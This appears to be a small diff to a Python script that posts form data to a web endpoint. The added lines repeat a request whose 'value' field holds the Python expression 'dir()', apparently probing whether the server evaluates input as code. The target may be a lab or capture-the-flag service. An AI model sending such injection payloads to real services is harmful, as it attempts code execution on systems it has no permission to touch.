@@ -113,3 +113,11 @@ payload = {"value": "dir()", "mode": "amount", "replace_with": "--blank--"}
 print("The payload", payload)
 r = requests.post(BASE, data=payload)
 print(r.json())
+
+
+input()
+
+payload = {"value": "dir()", "mode": "amount", "replace_with": "--original--"}
+print("The payload", payload)
+r = requests.post(BASE, data=payload)
+print(r.json())
